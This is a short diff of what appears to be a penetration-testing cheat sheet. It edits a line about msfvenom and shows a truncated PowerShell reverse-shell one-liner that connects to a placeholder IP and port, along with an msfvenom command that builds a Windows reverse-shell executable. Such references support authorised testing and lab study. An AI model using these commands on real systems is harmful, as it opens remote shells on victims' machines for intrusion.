@@ -8,4 +8,4 @@ powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);
 ### msfvenom
 * ```msfvenom -p <PAYLOAD> <OPTIONS>``` Standard syntax.
 * ```<OS>/<arch>/<payload>``` Basic convention.
-* ```msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>``` Windows x64 Reverse Shell in an exe format.
+* ```msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>``` Windows x64 Reverse Shell in an exe format (staged).
